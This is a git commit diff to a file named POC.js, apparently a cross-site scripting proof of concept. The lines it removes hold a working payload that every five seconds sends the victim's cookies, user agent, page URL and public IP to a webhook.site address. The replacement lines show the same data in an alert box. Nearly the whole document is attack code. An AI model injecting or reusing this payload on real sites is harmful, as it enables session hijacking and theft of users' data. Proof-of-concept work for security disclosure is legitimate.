be8c99b36d00094b0457ba97dbdf9f9cfee1d6a7
hamza lachgar <121760220+am7maaz@users.noreply.github.com>
2025-06-08 15:03:23 +0100

    Update POC.js

--- POC.js
+++ POC.js
@@ -1,7 +1,8 @@
-setInterval(() => {
-  fetch('https://api.ipify.org?format=json')
-    .then(r => r.json())
-    .then(d => {
-      fetch('https://webhook.site/76ae22f0-c5d3-4c12-af91-358ba81cf82f?cookie=' + document.cookie + '&ua=' + navigator.userAgent + '&loc=' + location.href + '&ip=' + d.ip);
-    });
-}, 5000);
+fetch('//api.ipify.org?format=json')
+  .then(r => r.json())
+  .then(d => {
+    alert('Cookie: ' + document.cookie +
+      '\nIP: ' + d.ip +
+      '\nUA: ' + navigator.userAgent +
+      '\nURL: ' + location.href);
+  });
